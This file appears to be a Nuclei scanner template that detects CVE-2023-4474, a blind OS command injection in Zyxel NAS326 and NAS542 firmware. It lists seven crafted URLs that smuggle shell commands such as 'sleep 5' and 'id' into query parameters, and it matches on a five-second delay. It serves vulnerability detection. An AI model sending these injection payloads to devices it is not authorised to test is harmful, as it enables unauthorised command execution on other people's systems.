id: CVE-2023-4474

info:
  name: Zyxel NAS326 Multiple Blind OS Command Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: The improper neutralization of special elements in the WSGI server of the Zyxel NAS326 firmware version V5.21(AAZF.14)C0 and NAS542 firmware version V5.21(ABAG.11)C0 could allow an unauthenticated attacker to execute some operating system (OS) commands by sending a crafted URL to a vulnerable device.
  impact: |
    Successful exploitation could lead to remote code execution.
  remediation: |
    Update to the latest firmware version provided by Zyxel.
  reference:
    - https://bugprove.com/knowledge-hub/cve-2023-4473-and-cve-2023-4474-authentication-bypass-and-multiple-blind-os-command-injection-vulnerabilities-in-zyxel-s-nas-326-devices/
    - https://github.com/Tig3rHu/Awesome_IOT_Vul_lib
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-4474
    cwe-id: CWE-78
    epss-score: 0.0011
    epss-percentile: 0.4568
    cpe: cpe:2.3:o:zyxel:nas326_firmware:*:*:*:*:*:*:*:*
  metadata:
    vendor: zyxel
    product: nas326_firmware
    fofa-query: app="zyxel-nas326"

http:
  - method: GET
    path:
      - "{{BaseURL}}/cmd,/ck6fup6/zypkg_main/pkg_disable/favicon.ico?pkgname=%26sleep%205"
      - "{{BaseURL}}/cmd,/ck6fup6/zypkg_main/pkg_install/favicon.ico?pkgname=a&active=b&volumeID=c%26id%3E/tmp/bugproved"
      - "{{BaseURL}}/cmd,/ck6fup6/system_main/whoami/favicon.ico"
      - "{{BaseURL}}/cmd,/ck6fup6/portal_main/pkg_init_cmd/register_main/setCookie?pkgname=myZyXELcloud-Agent&cmd=%3Bid&content=1"
      - "{{BaseURL}}/cmd,/ck6fup6/zylog_main/show_logging_entries/favicon.ico?type=%3bsleep%205"
      - "{{BaseURL}}/cmd,/ck6fup6/zylog_main/configure_mail_syslog/favicon.ico?schedulePeriod=daily&scheduleHour=1&scheduleMinute=%3bsleep%205"
      - "{{BaseURL}}/cmd,/ck6fup6/zylog_main/test_mail/favicon.ico?server=a&from=b&to=c%3bsleep%205"

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
